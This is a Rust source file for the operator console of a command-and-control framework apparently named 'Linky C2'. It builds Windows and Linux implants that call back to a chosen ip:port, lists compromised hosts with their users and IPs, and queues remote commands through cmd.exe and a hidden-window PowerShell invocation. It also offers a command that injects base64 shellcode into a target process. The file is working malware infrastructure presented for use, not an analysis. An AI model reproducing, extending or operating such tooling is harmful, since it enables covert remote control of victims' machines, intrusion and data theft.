use colored::Colorize;
use rustyline::{error::ReadlineError, DefaultEditor};
use std::sync::{Arc, Mutex};
use uuid::Uuid;

use crate::generate;
use crate::links::{LinkStatus, Links};

pub fn run(links: Arc<Mutex<Links>>) {
    println!("{}", "Linky C2 – type 'help' for commands\n".bold());

    let mut rl = DefaultEditor::new().expect("readline init failed");

    loop {
        match rl.readline("linky> ") {
            Ok(line) => {
                let line = line.trim().to_string();
                if line.is_empty() {
                    continue;
                }
                let _ = rl.add_history_entry(&line);

                let (cmd, rest) = split_first(&line);
                match cmd {
                    "links" => links_menu(&links, &mut rl),
                    "generate" => {
                        if rest.is_empty() {
                            println!("Usage: generate <ip:port>");
                        } else {
                            generate::generate_windows(rest);
                        }
                    }
                    "generate-linux" => {
                        if rest.is_empty() {
                            println!("Usage: generate-linux <ip:port>");
                        } else {
                            generate::generate_linux(rest);
                        }
                    }
                    "generate-native" => {
                        if rest.is_empty() {
                            println!("Usage: generate-native <ip:port>");
                        } else {
                            generate::generate_native(rest);
                        }
                    }
                    "help" => print_help(),
                    "exit" | "quit" | "kill" => {
                        println!("Exiting.");
                        std::process::exit(0);
                    }
                    _ => println!("Unknown command '{}'. Type 'help'.", cmd),
                }
            }
            Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => {
                println!("\nExiting.");
                std::process::exit(0);
            }
            Err(e) => eprintln!("readline error: {}", e),
        }
    }
}

// ── Links submenu ────────────────────────────────────────────────────────────

fn links_menu(links: &Arc<Mutex<Links>>, rl: &mut DefaultEditor) {
    println!("\n{}", "╔══════════════════════════════╗".cyan().bold());
    println!("{}", "║          LINKS MENU          ║".cyan().bold());
    println!("{}\n", "╚══════════════════════════════╝".cyan().bold());
    print_links_table(links);

    loop {
        match rl.readline("links> ") {
            Ok(line) => {
                let line = line.trim().to_string();
                if line.is_empty() {
                    continue;
                }
                let _ = rl.add_history_entry(&line);
                let (cmd, rest) = split_first(&line);

                match cmd {
                    "-h" | "help" => {
                        println!("  {}          Show all links (including inactive)", "-a".yellow());
                        println!("  {}   Interact with a link", "-i <name>".yellow());
                        println!("  {}   Send kill task + mark exited", "-k <name>".yellow());
                        println!("  {}        Return to main menu", "back".yellow());
                    }
                    "-a" => print_links_table(links),
                    "-i" => {
                        if rest.is_empty() {
                            println!("Usage: -i <name>");
                        } else if let Some(id) = resolve_link(links, rest) {
                            interact(links, id, rl);
                        } else {
                            println!("{} Link not found: {}", "[-]".red(), rest);
                        }
                    }
                    "-k" => {
                        if rest.is_empty() {
                            println!("Usage: -k <name>");
                        } else if let Some(id) = resolve_link(links, rest) {
                            let mut l = links.lock().unwrap();
                            l.add_task(id, "exit".into(), "kill".into());
                            l.kill_link(id);
                            println!("{} Kill task queued.", "[+]".green());
                        } else {
                            println!("{} Link not found: {}", "[-]".red(), rest);
                        }
                    }
                    "back" | "exit" | "q" => break,
                    "generate" | "generate-linux" | "generate-native" | "links" | "kill" | "quit" => {
                        println!(
                            "'{}' is a top-level command. Type 'back' to return to the main menu first.",
                            cmd
                        );
                    }
                    _ => println!("Unknown command '{}'. Type -h for help.", cmd),
                }
            }
            Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => break,
            Err(e) => eprintln!("readline: {}", e),
        }
    }
}

fn print_links_table(links: &Arc<Mutex<Links>>) {
    let links = links.lock().unwrap();
    let all = links.all_links();
    if all.is_empty() {
        println!("{} No links registered.", "[*]".cyan());
        return;
    }
    println!(
        "\n{}",
        format!(
            "{:<12} {:<24} {:<18} {:<12} {:<10}",
            "Name", "User@Host", "IP", "Platform", "Status"
        )
        .cyan()
        .bold()
    );
    println!("{}", "─".repeat(78).cyan());
    for l in all {
        let status = match l.status {
            LinkStatus::Active => "Active".green().bold().to_string(),
            LinkStatus::Inactive => "Inactive".yellow().to_string(),
            LinkStatus::Exited => "Exited".red().to_string(),
        };
        println!(
            "{:<12} {:<24} {:<18} {:<12} {}",
            l.name,
            format!("{}@{}", l.username, l.hostname),
            l.internal_ip,
            l.platform,
            status,
        );
    }
    println!();
}

// ── Per-link interaction ─────────────────────────────────────────────────────

fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
    {
        let l = links.lock().unwrap();
        if let Some(link) = l.get_link(link_id) {
            println!(
                "\n{} Interacting with {} – {}@{} [{}]",
                "[*]".cyan(),
                link.name.bold(),
                link.username,
                link.hostname,
                link.platform.yellow()
            );
            println!("    Type 'help' for commands, 'back' to return\n");
        }
    }

    loop {
        let prompt = {
            let l = links.lock().unwrap();
            l.get_link(link_id)
                .map(|lk| format!("{}> ", lk.name))
                .unwrap_or_else(|| "link> ".into())
        };

        match rl.readline(&prompt) {
            Ok(line) => {
                let line = line.trim().to_string();
                if line.is_empty() {
                    continue;
                }
                let _ = rl.add_history_entry(&line);
                let (cmd, args) = split_first(&line);

                match cmd {
                    "help" => print_link_help(),
                    "back" | "exit" => break,
                    "info" => show_info(links, link_id),
                    "kill" => {
                        let mut l = links.lock().unwrap();
                        l.add_task(link_id, "exit".into(), "kill".into());
                        l.kill_link(link_id);
                        println!("{} Kill task queued.", "[+]".green());
                        break;
                    }

                    // ── Shell execution helpers ──────────────────────────
                    "cmd" => {
                        if !is_windows(links, link_id) {
                            println!("{} 'cmd' is a Windows-only command.", "[-]".red());
                        } else {
                            queue(links, link_id, format!("cmd /C {}", args), line.clone());
                        }
                    }
                    "shell" => queue(links, link_id, line.clone(), line.clone()),
                    "powershell" | "ps" => {
                        if !is_windows(links, link_id) {
                            println!("{} 'powershell' is a Windows-only command.", "[-]".red());
                        } else {
                            queue(
                                links,
                                link_id,
                                format!("powershell -noP -sta -w 1 -c \"{}\"", args),
                                line.clone(),
                            );
                        }
                    }

                    // ── Built-in navigation ─────────────────────────────
                    "cd" | "pwd" | "ls" | "whoami" | "pid" => {
                        queue(links, link_id, line.clone(), line.clone())
                    }
                    "integrity" => {
                        if !is_windows(links, link_id) {
                            println!("{} 'integrity' is a Windows-only command.", "[-]".red());
                        } else {
                            queue(links, link_id, line.clone(), line.clone());
                        }
                    }

                    // ── Process injection ───────────────────────────────
                    "inject" => {
                        if !is_windows(links, link_id) {
                            println!("{} 'inject' is a Windows-only command.", "[-]".red());
                        } else {
                            queue(links, link_id, line.clone(), line.clone());
                        }
                    }

                    // ── Catch-all: send raw ─────────────────────────────
                    _ => queue(links, link_id, line.clone(), line.clone()),
                }
            }
            Err(ReadlineError::Interrupted) | Err(ReadlineError::Eof) => break,
            Err(e) => eprintln!("readline: {}", e),
        }
    }
}

fn show_info(links: &Arc<Mutex<Links>>, link_id: Uuid) {
    let l = links.lock().unwrap();
    if let Some(link) = l.get_link(link_id) {
        println!("  Name      : {}", link.name);
        println!("  ID        : {}", link.id);
        println!("  User      : {}@{}", link.username, link.hostname);
        println!("  Internal  : {}", link.internal_ip);
        println!("  Platform  : {}", link.platform);
        println!("  PID       : {}", link.pid);
        println!(
            "  First seen: {}",
            link.first_checkin.format("%Y-%m-%d %H:%M:%S")
        );
        println!(
            "  Last seen : {}",
            link.last_checkin.format("%Y-%m-%d %H:%M:%S")
        );
        let status = match link.status {
            LinkStatus::Active => "Active".green().bold().to_string(),
            LinkStatus::Inactive => "Inactive".yellow().to_string(),
            LinkStatus::Exited => "Exited".red().to_string(),
        };
        println!("  {}    : {}", "Status".cyan(), status);
    }
}

fn is_windows(links: &Arc<Mutex<Links>>, link_id: Uuid) -> bool {
    links
        .lock()
        .unwrap()
        .get_link(link_id)
        .map(|l| l.platform == "windows")
        .unwrap_or(false)
}

fn queue(links: &Arc<Mutex<Links>>, link_id: Uuid, command: String, cli_cmd: String) {
    let mut l = links.lock().unwrap();
    l.add_task(link_id, command, cli_cmd);
}

fn resolve_link(links: &Arc<Mutex<Links>>, name: &str) -> Option<Uuid> {
    links.lock().unwrap().get_link_by_name(name).map(|l| l.id)
}

// ── Helpers ──────────────────────────────────────────────────────────────────

/// Split "cmd rest…" → ("cmd", "rest…").
fn split_first(s: &str) -> (&str, &str) {
    match s.find(' ') {
        Some(i) => (&s[..i], s[i + 1..].trim_start()),
        None => (s, ""),
    }
}

fn print_help() {
    println!("  links                    Manage active links");
    println!("  generate <ip:port>       Build Windows implant (x86_64-pc-windows-gnu)");
    println!("  generate-linux <ip:port> Build Linux implant   (x86_64-unknown-linux-musl)");
    println!("  generate-native <ip:port> Build native Linux implant (x86_64-unknown-linux-gnu)");
    println!("  help                     Show this help");
    println!("  exit / kill              Quit linky");
}

fn print_link_help() {
    println!("  cmd <args>          Execute via cmd.exe /C <args>");
    println!("  shell <cmd>         Send raw command string");
    println!("  powershell <args>   Execute via powershell.exe");
    println!("  ls [path]           List directory");
    println!("  cd <path>           Change directory");
    println!("  pwd                 Print working directory");
    println!("  whoami              Current user (domain\\user)");
    println!("  pid                 Process ID");
    println!("  integrity           Token integrity level");
    println!("  inject <pid> <b64>  Inject base64 shellcode into PID");
    println!("  info                Show link metadata");
    println!("  kill                Send exit + mark link dead");
    println!("  back                Return to links menu");
}
